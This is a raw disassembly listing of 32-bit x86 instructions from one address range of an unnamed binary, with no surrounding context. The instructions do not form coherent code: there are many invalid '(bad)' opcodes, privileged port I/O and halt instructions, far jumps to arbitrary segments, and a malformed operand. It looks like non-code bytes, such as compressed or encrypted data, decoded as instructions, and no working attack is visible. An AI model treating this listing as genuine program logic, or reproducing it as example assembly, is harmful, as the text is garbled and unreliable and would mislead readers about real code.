  41a322:	js     0x41a311
  41a324:	adc    BYTE PTR [ebp+0x4cdf153e],dl
  41a32a:	lahf   
  41a32b:	sbb    al,0xec
  41a32d:	js     0x41a2e4
  41a32f:	sub    DWORD PTR [ecx+0x19a726bc],ebp
  41a335:	add    ch,dh
  41a337:	jno    0x41a33b
  41a339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a33a:	pop    ss
  41a33b:	dec    edx
  41a33c:	push   0xffffffb1
  41a33e:	inc    edi
  41a33f:	mov    ecx,0x72380040
  41a344:	push   ebx
  41a345:	(bad)  
  41a346:	push   0x2c823155
  41a34b:	jp     0x41a32c
  41a34d:	hlt    
  41a34e:	ins    DWORD PTR es:[edi],dx
  41a34f:	sub    al,0x8b
  41a351:	add    bh,0xd3
  41a354:	fadd   DWORD PTR [edi+0x42c6b920]
  41a35a:	pop    ss
  41a35b:	pop    ebx
  41a35c:	fdiv   QWORD PTR [ebx+esi*4-0x6e02be07]
  41a363:	xor    ah,al
  41a365:	pop    ds
  41a366:	test   eax,0x2b905fb3
  41a36b:	ins    BYTE PTR es:[edi],dx
  41a36c:	jge    0x41a3c9
  41a36e:	aas    
  41a36f:	mov    ah,0xd4
  41a371:	mov    ebx,0xf0ce53cf
  41a376:	ret    
  41a377:	xchg   BYTE PTR [eax],dl
  41a379:	push   ebx
  41a37a:	dec    esp
  41a37b:	repz push ss
  41a37d:	mov    bl,0x24
  41a37f:	xchg   esp,eax
  41a380:	xor    eax,0xb7750c8b
  41a385:	pop    ss
  41a386:	sbb    cl,BYTE PTR [edx-0x59]
  41a389:	and    BYTE PTR [esi-0x5ef91e0d],ah
  41a38f:	mov    esp,0xd48de1aa
  41a394:	jmp    0x73a6a420
  41a399:	cli    
  41a39a:	(bad)  
  41a39b:	cmp    eax,0xbf4d0618
  41a3a0:	(bad)  
  41a3a2:	dec    edi
  41a3a3:	dec    ecx
  41a3a4:	pop    eax
  41a3a5:	add    edi,DWORD PTR [ebx-0x14]
  41a3a8:	inc    edi
  41a3a9:	enter  0x44c6,0x41
  41a3ad:	addr16 pop ecx
  41a3af:	shr    BYTE PTR ds:0xd8bb3647,1
  41a3b5:	pop    ss
  41a3b6:	ret    0x1a33
  41a3b9:	xlat   BYTE PTR ds:[ebx]
  41a3ba:	sahf   
  41a3bb:	std    
  41a3bc:	push   ecx
  41a3bd:	push   ebx
  41a3be:	mov    dl,0x36
  41a3c0:	xor    ebp,esp
  41a3c2:	fnstcw WORD PTR [esp-0x69341a71]
  41a3c9:	sbb    cl,ah
  41a3cb:	inc    esi
  41a3cc:	xchg   edi,eax
  41a3cd:	jp     0x41a381
  41a3cf:	xor    esp,DWORD PTR [ecx-0x2c6c3dc2]
  41a3d5:	int3   
  41a3d6:	cmp    BYTE PTR [eax],dh
  41a3d8:	inc    edi
  41a3d9:	push   es
  41a3da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3db:	test   eax,0xfcdeca5c
  41a3e0:	pop    esp
  41a3e1:	daa    
  41a3e2:	idiv   BYTE PTR [eax-0x44]
  41a3e5:	rcl    esp,cl
  41a3e7:	mov    bl,0x17
  41a3e9:	jbe    0x41a392
  41a3eb:	mov    DWORD PTR [esi-0x69af851a],esp
  41a3f1:	cmp    ebp,edx
  41a3f3:	scas   eax,DWORD PTR es:[edi]
  41a3f4:	mov    eax,ds:0x98c64301
  41a3f9:	xchg   BYTE PTR [ebp-0x49],bl
  41a3fc:	and    BYTE PTR [eax],bh
  41a3fe:	inc    ebp
  41a3ff:	sub    esi,0xb25f37ab
  41a405:	adc    eax,0xa9fab40a
  41a40a:	fldcw  WORD PTR [edi+eax*2+0x2ef66635]
  41a411:	call   0x4a6551a6
  41a416:	and    al,0xc3
  41a418:	out    dx,al
  41a419:	jl     0x41a489
  41a41b:	(bad)  
  41a41c:	pop    esi
  41a41d:	push   ebp
  41a41e:	outs   dx,BYTE PTR ds:[esi]
  41a41f:	cdq    
  41a420:	mov    dh,0x79
  41a422:	jno    0x41a492
  41a424:	and    DWORD PTR [bp+di+0x60b0],ebx
  41a429:	push   esi
  41a42a:	xchg   DWORD PTR [edi-0x12],esp
  41a42d:	test   al,0x0
  41a42f:	scas   al,BYTE PTR es:[edi]
  41a430:	add    BYTE PTR [eax-0x5079de4d],bh
  41a436:	jmp    0x8f4655cb
  41a43b:	jecxz  0x41a3e0
  41a43d:	add    bl,BYTE PTR es:[ebx+esi*8]
  41a441:	xchg   esp,eax
  41a442:	js     0x41a401
  41a444:	and    al,bl
  41a446:	(bad)  
  41a448:	mov    ebp,0x563ff120
  41a44d:	cdq    
  41a44e:	js     0x41a402
  41a450:	mov    dl,0x8f
  41a452:	and    eax,0x653c6053
  41a457:	xchg   ebx,eax
  41a458:	cmp    eax,0x69ab0654
  41a45d:	pop    edi
  41a45e:	std    
  41a45f:	cld    
  41a460:	in     al,dx
  41a461:	xlat   BYTE PTR ds:[ebx]
  41a462:	test   eax,0xfbf4ed3a
  41a467:	cmp    dl,BYTE PTR [eax-0x24]
  41a46a:	adc    al,0x13
  41a46c:	outs   dx,BYTE PTR ds:[esi]
  41a46d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a46e:	into   
  41a46f:	push   cs
  41a470:	fbstp  TBYTE PTR [esp+eax*1]
  41a473:	imul   edi,DWORD PTR [eax],0x9486f5d9
  41a479:	pop    esi
  41a47a:	ds cld 
  41a47c:	(bad)  
  41a47d:	jno    0x41a4f2
  41a47f:	mov    ebx,DWORD PTR [esi+esi*2+0x7e]
  41a483:	jmp    0xaee48d4d
  41a488:	jo     0x41a424
  41a48a:	or     BYTE PTR [ebx+0x59],ch
  41a48d:	lahf   
  41a48e:	shl    DWORD PTR [ebp+0x2589cbc7],cl
  41a494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a495:	add    eax,0xe7667c55
  41a49a:	push   0xb50272ea
  41a49f:	fmul   DWORD PTR [edx+0x1a1aa621]
  41a4a5:	cmp    al,0x31
  41a4a7:	or     eax,0xfb693e48
  41a4ac:	sbb    al,0xbd
  41a4ae:	dec    esi
  41a4af:	sub    ecx,ebp
  41a4b1:	loope  0x41a449
  41a4b3:	call   0xd346f631
  41a4b8:	js     0x41a49f
  41a4ba:	jg     0x41a4cf
  41a4bc:	mov    ah,0xf0
  41a4be:	test   eax,0x7b068921
  41a4c3:	sbb    esi,DWORD PTR [edx]
  41a4c5:	xor    dh,BYTE PTR [edx+0x2606001d]
  41a4cb:	cli    
  41a4cc:	loopne 0x41a455
  41a4ce:	inc    edi
  41a4cf:	adc    dl,BYTE PTR [ecx-0x5fe68ebd]
  41a4d5:	retf   
  41a4d6:	jecxz  0x41a4b1
  41a4d8:	inc    eax
  41a4d9:	xchg   DWORD PTR [ebx],esi
  41a4db:	sbb    bh,dh
  41a4dd:	xor    al,0x65
  41a4df:	popf   
  41a4e0:	mov    DWORD PTR [esi-0x32],edi
  41a4e3:	scas   al,BYTE PTR es:[edi]
  41a4e4:	sar    BYTE PTR [edx+0xc],1
  41a4e7:	cli    
  41a4e8:	in     eax,dx
  41a4e9:	stc    
  41a4ea:	jnp    0x41a495
  41a4ec:	jle    0x41a4a0
  41a4ee:	retf   
  41a4ef:	push   ss
  41a4f0:	mov    cl,0xfe
  41a4f2:	fld    st(0)
  41a4f4:	(bad)  
  41a4f6:	out    dx,al
  41a4f7:	jge    0x41a495
  41a4f9:	xor    ah,BYTE PTR [ebp-0x6a55c05f]
  41a4ff:	scas   eax,DWORD PTR es:[edi]
  41a500:	(bad)  
  41a503:	add    dl,dh
  41a505:	sahf   
  41a506:	fidiv  DWORD PTR [edx]
  41a508:	and    eax,0x30ef212c
  41a50d:	cmp    eax,0xb01d6cec
  41a512:	mov    ch,0x7a
  41a514:	or     eax,DWORD PTR [edx+0x11202dc5]
  41a51a:	loop   0x41a593
  41a51c:	mov    gs,WORD PTR [ebx]
  41a51e:	scas   al,BYTE PTR es:[edi]
  41a51f:	and    esi,edx
  41a521:	(bad)  {k4}{z}
  41a526:	pop    edi
  41a527:	daa    
  41a528:	inc    ebx
  41a529:	out    0x18,eax
  41a52b:	cs in  al,0x64
  41a52e:	in     eax,dx
  41a52f:	xchg   ebp,eax
  41a530:	stc    
  41a531:	mov    dh,0x32
  41a533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a534:	xor    BYTE PTR [eax],0xae
  41a537:	(bad)  
  41a539:	enter  0x314e,0x3b
  41a53d:	cmp    al,0x57
  41a53f:	aad    0xf8
  41a541:	imul   esp,DWORD PTR [ecx+0x48ea71e6],0x59
  41a548:	xor    BYTE PTR [esi-0x6a],dh
  41a54b:	add    eax,0x862a1bd7
  41a550:	or     ecx,DWORD PTR ds:0x12ea12ff
  41a556:	enter  0xe444,0x68
  41a55a:	into   
  41a55b:	push   ebx
  41a55c:	outs   dx,DWORD PTR ds:[esi]
  41a55d:	fdivr  DWORD PTR [ecx-0x7d]
  41a560:	mov    ch,0x22
  41a562:	lock pop edx
  41a564:	push   esp
  41a565:	mov    al,ds:0xd4da02df
  41a56a:	jle    0x41a5af
  41a56c:	test   dl,dl
  41a56e:	stos   DWORD PTR es:[edi],eax
  41a56f:	mov    al,ds:0x9e6ad89a
  41a574:	jne    0x41a56e
  41a576:	jns    0x41a52c
  41a578:	addr16 mov ebx,0x18a475e0
  41a57e:	pop    ecx
  41a57f:	mov    esi,0xaf0f2810
  41a584:	popf   
  41a585:	push   ss
  41a586:	xlat   BYTE PTR ds:[ebx]
  41a587:	hlt    
  41a588:	mov    esp,0x3178d5a2
  41a58d:	jae    0x41a51c
  41a58f:	cmp    eax,0xf3ad3567
  41a594:	lds    ecx,FWORD PTR [esi-0x53c15ad8]
  41a59a:	mov    ds:0xb00374c1,al
  41a59f:	xor    DWORD PTR [ebp-0x56],eax
  41a5a2:	pop    ebp
  41a5a3:	jmp    0xb1a6:0x22a8545b
  41a5aa:	pop    edi
  41a5ab:	mov    ds:0x9e19654e,eax
  41a5b0:	sar    DWORD PTR [edx+0x3],1
  41a5b3:	scas   al,BYTE PTR es:[edi]
  41a5b4:	xor    dl,dh
  41a5b6:	loope  0x41a5ba
  41a5b8:	retf   
  41a5b9:	mov    BYTE PTR ds:0xe5bbbcd0,dh
  41a5bf:	in     al,0x11
  41a5c1:	add    bh,ch
  41a5c3:	mov    BYTE PTR [edx+0x57e14b11],0xe
  41a5ca:	das    
  41a5cb:	(bad)  
  41a5cc:	fadd   QWORD PTR [ebx-0x71]
  41a5cf:	dec    ecx
  41a5d0:	in     al,0xf7
  41a5d2:	lock dec eax
  41a5d4:	ror    BYTE PTR [edx],cl
  41a5d6:	shl    DWORD PTR [eax+eiz*2+0x6baa94b6],cl
  41a5dd:	jo     0x41a59b
  41a5df:	mov    BYTE PTR [ebx],dh
  41a5e1:	scas   al,BYTE PTR es:[edi]
  41a5e2:	sbb    BYTE PTR [eax-0x4a],dh
  41a5e5:	xor    DWORD PTR [ecx+0x49e5062e],edx
  41a5eb:	nop
  41a5ec:	ffreep st(6)
  41a5ee:	cmp    eax,DWORD PTR ds:0x14f5cdfb
  41a5f4:	repz mov al,ds:0x79510d3d
  41a5fa:	mov    eax,ds:0x2da5452a
  41a5ff:	push   ecx
  41a600:	arpl   WORD PTR [ecx],ax
  41a602:	or     BYTE PTR [edi],0x24
  41a605:	mov    bl,BYTE PTR [edx+ebx*2+0x46]
  41a609:	fistp  QWORD PTR [ebx+0x37]
  41a60c:	xchg   esp,eax
  41a60d:	jno    0x41a5bd
  41a60f:	ins    BYTE PTR es:[edi],dx
  41a610:	and    al,0x67
  41a612:	jmp    0x41a62d
  41a614:	pop    ebx
  41a615:	pop    ebx
  41a616:	pop    esi
  41a617:	or     al,0x1b
  41a619:	arpl   WORD PTR [edi+0x59d0e835],si
  41a61f:	imul   ebp,DWORD PTR [edx],0x26
  41a622:	bound  ecx,QWORD PTR ds:0xc64bd19b
  41a628:	and    al,0x29
  41a62a:	inc    esp
  41a62b:	xor    ebp,DWORD PTR [ebp+0x7c]
  41a62e:	xlat   BYTE PTR ds:[ebx]
  41a62f:	mov    ebx,0xc3ff59ff
  41a634:	cmp    ch,0x16
  41a637:	sbb    BYTE PTR [ebx],dl
  41a639:	jns    0x41a60c
  41a63b:	cmp    DWORD PTR [ebx+0x1908b52e],0x8f2bc1cf
  41a645:	ret    0xdf66
  41a648:	retf   
  41a649:	jo     0x41a6bf
  41a64b:	inc    esi
  41a64c:	or     ebp,DWORD PTR [esi+edi*1+0x1f]
  41a650:	pusha  
  41a651:	mov    ss,WORD PTR [ebp+esi*1-0x13aa76e6]
  41a658:	pop    es
  41a659:	jae    0x41a6c4
  41a65b:	cmp    eax,0x55a284c4
  41a660:	ins    BYTE PTR es:[edi],dx
  41a661:	or     al,0xf
  41a663:	sbb    ch,cl
  41a665:	(bad)  [edi-0x74fec5a7]
  41a66b:	adc    BYTE PTR [ebp+0x8],ch
  41a66e:	push   edi
  41a66f:	fbstp  TBYTE PTR [esi+0x2756d2db]
  41a675:	cmp    BYTE PTR [ebx+0xf52ba11],bl
  41a67b:	neg    BYTE PTR [edx-0x3a]
  41a67e:	aas    
  41a67f:	int3   
  41a680:	daa    
  41a681:	sbb    ecx,DWORD PTR [ebx-0x24cd56a6]
  41a687:	cmp    esp,DWORD PTR [esp+ebx*1+0x48bd89b8]
  41a68e:	call   0x57ee1c22
  41a693:	retf   
  41a694:	imul   esp,DWORD PTR [eax],0x674fc432
  41a69a:	aad    0x1d
  41a69c:	ins    BYTE PTR es:[edi],dx
  41a69d:	inc    eax
  41a69e:	sub    al,0x6b
  41a6a0:	call   0x75e3:0x27ac4058
  41a6a7:	inc    ebp
  41a6a8:	aad    0x66
  41a6aa:	(bad)  
  41a6ab:	mov    cl,0xe3
  41a6ad:	inc    ebp
  41a6ae:	mov    cl,0xea
  41a6b0:	sti    
  41a6b1:	mov    dl,BYTE PTR [ecx-0x14]
  41a6b4:	xchg   ebx,eax
  41a6b5:	pop    ecx
  41a6b6:	mov    ch,0xaf
  41a6b8:	sub    DWORD PTR [edx-0x74a319c1],edx
  41a6be:	cmp    eax,0xbf72fe7d
  41a6c3:	xchg   esp,eax
  41a6c4:	jnp    0x41a67a
  41a6c6:	imul   edx,DWORD PTR [ebx+0x7e],0xbd5c3414
  41a6cd:	repz inc ecx
  41a6cf:	mov    cs,esp
  41a6d1:	call   0x26d76f89
  41a6d6:	push   ecx
  41a6d7:	inc    edx
  41a6d8:	jns    0x41a749
  41a6da:	cmc    
  41a6db:	fmul   DWORD PTR cs:[esi+0x494a4aa5]
  41a6e2:	adc    BYTE PTR [ebx],bl
  41a6e4:	std    
  41a6e5:	sub    esi,DWORD PTR [edi+0x54]
  41a6e8:	rcl    BYTE PTR [ecx-0x62],1
  41a6eb:	hlt    
  41a6ec:	xchg   esp,eax
  41a6ed:	and    al,0xbe
  41a6ef:	fs mov edx,0xae30498e
  41a6f5:	(bad)  
  41a6f6:	fisubr WORD PTR [esi+0xec3a792]
  41a6fc:	mov    bl,0x34
  41a6fe:	push   ebx
  41a6ff:	jl     0x41a775
  41a701:	arpl   WORD PTR [edx-0x13],si
  41a704:	clc    
  41a705:	inc    ebp
  41a706:	add    BYTE PTR [ebx],dh
  41a708:	adc    eax,0xe69fa669
  41a70d:	push   cs
  41a70e:	ror    dl,cl
  41a710:	jmp    0x41a6a4
  41a712:	pusha  
  41a713:	cmp    eax,0x2afce7c0
  41a718:	xchg   DWORD PTR [ecx+0x2bb7403c],esi
  41a71e:	jae    0x41a76e
  41a720:	sbb    al,0x4a
  41a722:	sbb    DWORD PTR [edi],ebp
  41a724:	pop    esi
  41a725:	sar    DWORD PTR [ecx-0x6f73d14],cl
  41a72b:	add    BYTE PTR [eax+0x78],al
  41a72e:	les    edx,FWORD PTR [ecx+eiz*2+0x66]
  41a732:	xor    DWORD PTR [edx],ebx
  41a734:	inc    edi
  41a735:	inc    ebx
  41a736:	loopne 0x41a770
  41a738:	inc    ebp
  41a739:	push   esp
  41a73a:	mov    ch,0x38
  41a73c:	jae    0x41a6dc
  41a73e:	and    BYTE PTR [eax+0x579e5590],ah
  41a744:	inc    edi
  41a745:	ss push ds
  41a747:	std    
  41a748:	jmp    0x2102:0x42f0cc42
  41a74f:	adc    eax,0x834ff612
  41a754:	mov    ch,0xfc
  41a756:	shl    BYTE PTR [esp+edi*2+0x53ee572a],0xc9
  41a75e:	cld    
  41a75f:	dec    eax
  41a760:	jg     0x41a72b
  41a762:	and    dh,BYTE PTR [ecx]
  41a764:	adc    DWORD PTR [ecx],0xffffffdf
  41a767:	jl     0x41a785
  41a769:	push   esp
  41a76a:	(bad)  
  41a76b:	js     0x41a74c
  41a76d:	popf   
  41a76e:	leave  
  41a76f:	jb     0x41a7d6
  41a771:	pop    edi
  41a772:	es rcl ebx,1
  41a775:	cmp    DWORD PTR [eax-0x69],eax
  41a778:	mov    bl,0xb2
  41a77a:	ret    0xce8b
  41a77d:	leave  
  41a77e:	cmc    
  41a77f:	mov    ebx,0x24c5bc2
  41a784:	out    dx,al
  41a785:	xor    esp,DWORD PTR [edi]
  41a787:	or     al,0x93
  41a789:	mov    cl,0xf0
  41a78b:	adc    al,0x3b
  41a78d:	loope  0x41a7a8
  41a78f:	lock xchg edx,eax
  41a791:	push   esi
  41a792:	ins    DWORD PTR es:[edi],dx
  41a793:	jne    0x41a76a
  41a795:	add    bh,ch
  41a797:	cmp    ch,dl
  41a799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a79a:	adc    ecx,esp
  41a79c:	ja     0x41a794
  41a79e:	or     al,0x9f
  41a7a0:	nop
  41a7a1:	mov    cl,0xaf
  41a7a3:	sub    DWORD PTR [esi+ebp*8+0x4e2d12d0],eax
  41a7aa:	int3   
  41a7ab:	xchg   ebx,eax
  41a7ac:	mov    dh,0xe4
  41a7ae:	mov    bl,0xdb
  41a7b0:	dec    edi
  41a7b1:	sbb    al,BYTE PTR [edx-0x23]
  41a7b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7b5:	aaa    
  41a7b6:	mov    ebp,0xfe326704
  41a7bb:	mov    bh,0x69
  41a7bd:	sub    eax,0xacf4b179
  41a7c2:	push   ds
  41a7c3:	inc    ebx
  41a7c4:	pop    ecx
  41a7c5:	test   ebp,esi
  41a7c7:	iret   
  41a7c8:	jne    0x41a7b7
  41a7ca:	cmc    
  41a7cb:	pop    edx
  41a7cc:	js     0x41a775
  41a7ce:	mov    dl,0x71
  41a7d0:	cmp    ax,0x3468
  41a7d4:	gs aam 0x53
  41a7d7:	ret    0xf47c
  41a7da:	or     BYTE PTR [ecx],ah
  41a7dc:	mov    ds:0xd4454f20,al
  41a7e1:	add    BYTE PTR [edi-0x2e0e311],0x5
  41a7e8:	scas   eax,DWORD PTR es:[edi]
  41a7e9:	fs (bad) 
  41a7eb:	test   eax,0x73c94a6e
  41a7f0:	in     al,dx
  41a7f1:	aad    0x48
  41a7f3:	adc    edx,DWORD PTR [eax]
  41a7f5:	add    DWORD PTR [ebx-0x470c46f3],0xffffffe5
  41a7fc:	fidiv  WORD PTR [edx+0x4f]
  41a7ff:	inc    eax
  41a800:	add    al,0x42
  41a802:	outs   dx,DWORD PTR ds:[esi]
  41a803:	scas   eax,DWORD PTR es:[edi]
  41a804:	pop    ebp
  41a805:	jne    0x41a837
  41a807:	sbb    eax,0x65361893
  41a80c:	aas    
  41a80d:	mov    eax,0x5dd977a6
  41a812:	xchg   ebp,eax
  41a813:	adc    bl,al
  41a815:	test   eax,0xa0d375bf
  41a81a:	aaa    
  41a81b:	rep outs dx,BYTE PTR ds:[esi]
  41a81d:	aad    0x14
  41a81f:	push   eax
  41a820:	dec    esp
  41a821:	bound  ecx,QWORD PTR [ecx]
  41a823:	iret   
  41a824:	neg    ecx
  41a826:	pop    ebx
  41a827:	mov    ebp,0x46e4bf6
  41a82c:	ins    BYTE PTR es:[edi],dx
  41a82d:	ds pop edx
  41a82f:	push   ebx
  41a830:	aaa    
  41a831:	lds    esp,FWORD PTR [esi]
  41a833:	gs cld 
  41a835:	xor    al,0x57
  41a837:	bound  esp,QWORD PTR [edi+0x28068f3d]
  41a83d:	cmp    esp,DWORD PTR [ecx]
  41a83f:	popf   
  41a840:	fadd   DWORD PTR [edx]
  41a842:	lahf   
  41a843:	(bad)  
  41a844:	mov    edx,0x80456d2a
  41a849:	leave  
  41a84a:	dec    esi
  41a84b:	or     edi,ebp
  41a84d:	push   edi
  41a84e:	shl    BYTE PTR [edx],0xfc
  41a851:	sbb    BYTE PTR [ebp-0x4e],ah
  41a854:	imul   BYTE PTR [esi]
  41a856:	ret    0x8bc
  41a859:	xchg   ebx,eax
  41a85a:	stos   BYTE PTR es:[edi],al
  41a85b:	mov    eax,DWORD PTR [ecx+0x56]
  41a85e:	retf   
  41a85f:	(bad)  
  41a860:	out    dx,al
  41a861:	mov    esi,0xad7ec3a6
  41a866:	imul   esp,eax,0x470ef46f
  41a86c:	std    
  41a86d:	mov    ds:0xa082c7f0,al
  41a872:	sub    DWORD PTR [ebp-0x7c],0x4f6f135
  41a879:	mov    bl,0xff
  41a87b:	clc    
  41a87c:	xor    eax,0xa58bd72e
  41a881:	mov    eax,0xeb83c00
  41a886:	push   eax
  41a887:	inc    ebp
  41a888:	neg    DWORD PTR [esi+0x3faa7bf2]
  41a88e:	stos   BYTE PTR es:[edi],al
  41a88f:	inc    edi
  41a890:	inc    eax
  41a891:	xchg   esp,eax
  41a892:	dec    ebx
  41a893:	pop    ecx
  41a894:	mov    ?,WORD PTR [ebp-0xc]
  41a897:	xchg   edx,eax
  41a898:	cli    
  41a899:	jnp    0x41a859
  41a89b:	add    bh,BYTE PTR [esi]
  41a89d:	xchg   ebx,eax
  41a89e:	mov    dh,BYTE PTR [ebp-0x23bf7575]
  41a8a4:	jmp    0x41a869
  41a8a6:	outs   dx,BYTE PTR ds:[esi]
  41a8a7:	loope  0x41a8bb
  41a8a9:	mov    ebp,0xb09c7984
  41a8ae:	lods   eax,DWORD PTR ds:[esi]
  41a8af:	add    bl,bl
  41a8b1:	repnz sub ecx,DWORD PTR [esi]
  41a8b4:	mov    ecx,0x46612e50
  41a8b9:	cmp    BYTE PTR [eax+0x3b9a69d3],dh
  41a8bf:	fs inc edx
  41a8c1:	push   cs
  41a8c2:	pop    ecx
  41a8c3:	in     eax,dx
  41a8c4:	repz mov esi,0x44f99230
  41a8ca:	inc    esi
  41a8cb:	sbb    DWORD PTR [ecx-0x80],0xffffffef
  41a8cf:	stc    
  41a8d0:	mov    ds:0x7062a941,ax
  41a8d6:	inc    esi
  41a8d7:	out    0xec,al
  41a8d9:	or     al,0xdb
  41a8db:	jle    0x41a90f
  41a8dd:	and    eax,0x33609e25
  41a8e2:	pusha  
  41a8e3:	mov    eax,DWORD PTR ds:0xd2f39d6
  41a8e9:	xor    BYTE PTR [ebp-0x79b555b3],bh
  41a8ef:	and    ebx,0xe35f3e70
  41a8f5:	mov    esi,DWORD PTR [eax-0x71]
  41a8f8:	loope  0x41a931
  41a8fa:	sbb    edi,DWORD PTR [ebx+0x1c]
  41a8fd:	fisttp DWORD PTR ds:0x8336dbf7
  41a903:	(bad)  
  41a906:	and    DWORD PTR [edx],edx
  41a908:	int3   
  41a909:	xchg   ebp,eax
  41a90a:	leave  
  41a90b:	fs push ebx
  41a90d:	ins    BYTE PTR es:[edi],dx
  41a90e:	jmp    FWORD PTR [esi]
  41a910:	push   esi
  41a911:	lock test al,0xaa
  41a914:	call   0xca4ba70
  41a919:	or     DWORD PTR [ebp+0x63],eax
  41a91c:	adc    eax,0x2bc8a4dd
  41a921:	jg     0x41a8ff
  41a923:	add    DWORD PTR [ecx],0x6c
  41a926:	inc    ebp
  41a927:	ds (bad) 
  41a929:	hlt    
  41a92a:	retf   
  41a92b:	push   ebx
  41a92c:	leave  
  41a92d:	stos   DWORD PTR es:[edi],eax
  41a92e:	jmp    0x2a27:0xb9c305eb
  41a935:	or     al,0x91
  41a937:	mov    edx,0x72c429fa
  41a93c:	(bad)  
  41a93d:	mov    al,0x7b
  41a93f:	ret    0x77da
  41a942:	inc    esp
  41a943:	adc    eax,0x73d4c2ef
  41a948:	aad    0x6f
  41a94a:	scas   eax,DWORD PTR es:[edi]
  41a94b:	jae    0x41a927
  41a94d:	pop    es
  41a94e:	xor    ebp,0xfc5721f9
  41a954:	pop    edx
  41a955:	repnz mov cl,0xf4
  41a958:	jmp    0xaf354a91
  41a95d:	add    dl,BYTE PTR [ecx]
  41a95f:	mov    dh,0x6e
  41a961:	and    edx,esp
  41a963:	jle    0x41a989
  41a965:	sbb    edi,DWORD PTR [esp+ebx*8]
  41a968:	shl    DWORD PTR [eax+0x49],1
  41a96b:	xor    eax,0x7b56dde6
  41a970:	pop    esi
  41a971:	sub    al,0x7
  41a973:	leave  
  41a974:	and    BYTE PTR [eax-0x11],ah
  41a977:	xchg   edx,eax
  41a978:	jnp    0x41a951
  41a97a:	jo     0x41a99e
  41a97c:	or     al,0x6
  41a97e:	pop    ebx
  41a97f:	mov    DWORD PTR [eax+0x66],esi
  41a982:	in     al,0x52
  41a984:	pop    eax
  41a985:	adc    BYTE PTR [edi-0x61],0x56
  41a989:	jmp    0x816b42c5
  41a98e:	adc    DWORD PTR [ecx-0x47],ebx
  41a991:	cdq    
  41a992:	fwait
  41a993:	adc    BYTE PTR fs:[edi+0x14],dh
  41a997:	test   BYTE PTR [edx],bh
  41a999:	cmc    
  41a99a:	out    0x9e,eax
  41a99c:	in     al,0xe3
  41a99e:	push   esp
  41a99f:	mov    esp,0x53aa6509
  41a9a4:	iret   
  41a9a5:	adc    esp,0x15
  41a9a8:	ret    0xfcbc
  41a9ab:	dec    esi
  41a9ac:	xchg   esi,eax
  41a9ad:	push   edi
  41a9ae:	mov    cs,WORD PTR [eax]
  41a9b0:	(bad)  
  41a9b1:	or     ch,BYTE PTR ds:0xec736dec
  41a9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9b8:	gs in  al,dx
  41a9ba:	fmul   DWORD PTR [edi+0x3274c385]
  41a9c0:	pop    eax
  41a9c1:	fs into 
  41a9c3:	ror    BYTE PTR [eax+ebx*2-0x29],1
  41a9c7:	jge    0x41a987
  41a9c9:	hlt    
  41a9ca:	(bad)  
  41a9cc:	inc    eax
  41a9cd:	xchg   edx,eax
  41a9ce:	loope  0x41a962
  41a9d0:	jb     0x41a958
  41a9d2:	pop    eax
  41a9d3:	mov    esi,edx
  41a9d5:	mov    ebp,0x4d85a826
  41a9db:	sahf   
  41a9dc:	dec    esi
  41a9dd:	repz fcom QWORD PTR [edx*1-0x51289574]
  41a9e5:	jecxz  0x41aa66
  41a9e7:	push   ebp
  41a9e8:	mov    ecx,0xdd166b10
  41a9ed:	mov    ah,0x4a
  41a9ef:	adc    al,0x82
  41a9f1:	cmp    BYTE PTR [ebx+0x74493b04],0xb7
  41a9f8:	ror    BYTE PTR [ecx-0x2d8978b8],1
  41a9fe:	xchg   esp,eax
  41a9ff:	iret   
  41aa00:	icebp  
  41aa01:	dec    ebx
  41aa02:	cmp    eax,esp
  41aa04:	pop    ecx
  41aa05:	cmp    DWORD PTR [esp+edx*4],0xffffffec
  41aa09:	je     0x41a9e5
  41aa0b:	add    eax,edx
  41aa0d:	loope  0x41aa62
  41aa0f:	push   0xb3ef730a
  41aa14:	dec    ebx
  41aa15:	and    edi,ebp
  41aa17:	ins    DWORD PTR es:[edi],dx
  41aa18:	in     eax,dx
  41aa19:	mov    bl,ch
  41aa1b:	out    dx,al
  41aa1c:	push   0xffffffea
  41aa1e:	imul   ebx,DWORD PTR [ebx+esi*4],0xffffffb5
  41aa22:	cmp    cl,BYTE PTR [eax-0x3d]
  41aa25:	push   0xffffffc8
  41aa27:	ret    
  41aa28:	neg    ecx
  41aa2a:	retf   0xa223
  41aa2d:	jb     0x41aa1c
  41aa2f:	xlat   BYTE PTR ds:[ebx]
  41aa30:	outs   dx,BYTE PTR ds:[esi]
  41aa31:	jmp    0xc9b966f0
  41aa36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa38:	xchg   BYTE PTR [esi-0x360f7b05],al
  41aa3e:	aam    0x52
  41aa40:	fdivr  DWORD PTR [esi-0x2e]
  41aa43:	cmp    al,0x85
  41aa45:	lods   al,BYTE PTR ds:[esi]
  41aa46:	cmp    dl,bl
  41aa48:	clc    
  41aa49:	jg     0x41aaaa
  41aa4b:	mov    ds:0x2ec5c4ac,al
  41aa50:	icebp  
  41aa51:	ds out 0xf7,al
  41aa54:	pop    esp
  41aa55:	sbb    eax,0x655c164f
  41aa5a:	dec    esp
  41aa5b:	mov    ebp,0xf8b280fe
  41aa60:	das    
  41aa61:	sti    
  41aa62:	or     DWORD PTR [edx-0x645b9945],ecx
  41aa68:	test   BYTE PTR [eax-0x4f],ah
  41aa6b:	cdq    
  41aa6c:	mov    dh,0x55
  41aa6e:	cmp    eax,edx
  41aa70:	test   eax,0x4e7b5b0
  41aa75:	or     ah,bh
  41aa77:	loope  0x41aa3c
  41aa79:	push   ebx
  41aa7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa7b:	push   ebx
  41aa7c:	jo     0x41aae5
  41aa7e:	(bad)
  41aa81:	hlt    
  41aa82:	fst    DWORD PTR [edi+0x5cb140cf]
  41aa88:	in     al,0x46
  41aa8a:	hlt    
  41aa8b:	out    dx,eax
  41aa8c:	inc    ebx
  41aa8d:	(bad)  
  41aa8e:	js     0x41ab0b
  41aa90:	addr16 mov esi,0xd80ac80
  41aa96:	(bad)  
  41aa97:	xchg   edi,eax
